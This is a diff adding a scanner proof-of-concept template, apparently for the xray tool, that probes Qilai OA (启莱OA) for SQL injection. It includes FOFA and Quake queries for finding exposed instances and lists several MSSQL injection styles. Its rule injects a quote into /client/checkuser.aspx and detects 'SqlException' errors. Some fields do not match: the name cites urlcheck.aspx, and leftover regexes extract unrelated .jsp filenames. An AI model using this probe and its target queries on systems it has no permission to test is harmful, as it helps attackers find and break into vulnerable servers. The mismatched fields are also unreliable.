@@ -1,0 +1,45 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="启莱OA"
+    hunter-query: 
+    quake-query: app:"启莱OA"
+    zoomeye-query:
+    threatbook-query:
+    cve: 
+    cnvd:
+    tips:  mssql | 叠堆注入 | 时间盲注 | 报错注入 | 联合注入
+    
+name: poc-yaml-qilai-OA-urlcheck.aspx-sqli
+manual: true
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+    t1: timeConvert(now(), '2006-01-02')
+rules:
+  r0:
+    request:
+      method: GET
+      cache: true
+      path: /client/checkuser.aspx?user=1'&pwd=1
+      follow_redirects: false      
+      headers:
+      body:
+    expression: >-
+      response.status == 500 && response.body_string.contains("SqlException")
+
+    output:
+      search: |-
+        "(?P<filename>\\w+.jsp)".bsubmatch(response.body)
+      filename: search["filename"]
+      search1: |-
+        "(?P<newpath>ico.*jsp)".bsubmatch(response.body)
+      newpath: search["newpath"]
+
+expression: r0() 
